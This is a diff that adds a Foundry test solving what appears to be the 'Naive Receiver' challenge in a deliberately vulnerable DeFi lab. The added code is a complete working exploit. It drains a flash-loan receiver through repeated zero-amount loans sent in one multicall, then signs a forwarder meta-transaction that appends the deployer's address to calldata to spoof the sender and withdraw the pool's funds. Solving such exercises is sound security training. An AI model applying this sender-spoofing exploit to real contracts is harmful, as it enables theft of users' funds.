@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -78,6 +79,29 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
         
+        bytes[] memory data = new bytes[](10);
+        for (uint i = 0; i < 10; i++) {
+            data[i] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 0, ""));
+        }
+        pool.multicall(data);
+        bytes[] memory multiData = new bytes[](1);
+        multiData[0] = abi.encodeWithSignature("withdraw(uint256,address)", 1010e18, payable(recovery), deployer);
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: 0,
+            data: abi.encodeWithSignature("multicall(bytes[])", multiData),
+            deadline: block.timestamp
+        });
+        
+        bytes2 sig_part1 = 0x1901;
+        bytes32 sig_part2 = forwarder.domainSeparator();
+        bytes32 sig_part3 = forwarder.getDataHash(request);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, keccak256(abi.encodePacked(sig_part1, sig_part2, sig_part3)));
+        forwarder.execute(request, abi.encodePacked(r, s, v));
     }
 
     /**
